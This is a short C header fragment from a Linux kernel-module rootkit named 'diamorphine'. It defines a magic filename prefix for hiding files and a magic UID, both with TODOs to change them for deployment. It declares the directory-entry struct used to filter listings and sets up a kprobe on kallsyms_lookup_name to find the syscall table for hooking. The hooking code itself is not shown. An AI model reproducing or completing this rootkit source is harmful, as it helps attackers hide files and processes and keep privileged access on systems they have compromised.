#define MAGIC_PREFIX "341341234" //TODO (): Change this
#define MAGIC_EUID 0 //TODO (): Change this to match the unpriliged user's UID
#define MODULE_NAME "diamorphine"

/*
This struct represents a directory entry
*/
struct linux_dirent {
        unsigned long   d_ino;      // Inode of entry         
        unsigned long   d_off;      // Entry's offest to the next dirent
        unsigned short  d_reclen;   // Entry's length
        char            d_name[1];  // Entry's string name
};

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

// Used to find sys_call_table
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};
